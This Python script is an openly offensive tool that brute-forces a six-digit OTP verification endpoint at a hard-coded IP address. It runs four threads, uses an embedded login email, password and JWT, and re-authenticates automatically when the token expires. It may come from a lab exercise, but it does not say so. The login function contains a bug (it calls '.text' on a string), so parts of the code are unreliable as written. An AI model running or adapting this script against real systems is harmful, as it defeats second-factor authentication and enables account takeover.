import asyncio
import aiohttp
import json
import threading

# global jwt

async def login_again():
    url = 'http://165.227.147.243:8081/api/sign-in'
    headers= {
        "Content-Type": "application/json",
        "Origin": "http://165.227.147.243:8081"
    }
    data =json.dumps({"user":{"email":"micheal@greenfist.xyz","password":"ola"}})
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data, headers=headers) as response:
            res_auth =  await response.text()
            print(res_auth)
            jwt = json.loads(res_auth.text)['token']
            return jwt
    


async def check_password(password, cred={"jwt":''}):
    url = 'http://165.227.147.243:8081/api/verify-otp'
    data = json.dumps({"code": {"code":password}})
    header = {
            "Authorization": f"Bearer {cred['jwt']}",
            "x-requestor": "Ryan",
            "Content-Type": "application/json",
            "Origin": "http://165.227.147.243:8081",
        }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data = data, headers = header) as response:
            res = await response.text()
            if "Unauthorized."  in res or "jwt" in res :
                cred['jwt'] = await login_again()

            return response



def brute_force(start, end, cred):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def worker():
        ola = await brute_force_async(start, end, cred)
        if ola:
            exit(0)


    loop.run_until_complete(worker())
    loop.close()

async def brute_force_async(start, end, cred):
    
    for i in range(start, end):
        password = str(i).zfill(6)
        result = await check_password(password, cred)
        if result.status == 200:
            print('Password found:', password)
            return password
            

def main():
    num_threads = 4
    total_combinations = 1000000
    combinations_per_thread = total_combinations // num_threads

    cred = {"jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im1pY2hhZWxAZ3JlZW5maXN0Lnh5eiIsImlhdCI6MTY3NzgzMzE1OTk5OSwiZXhwIjoxNjc3ODM2NzU2OTk5OX0.8GbQDHbTOau7f5w3mINg9Sdu44JhW1qqRgoROKr8WIE"}

    threads = []
    for i in range(num_threads):
        start = i * combinations_per_thread
        end = (i + 1) * combinations_per_thread
        thread = threading.Thread(target=brute_force, args=(start, end, cred))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    main()
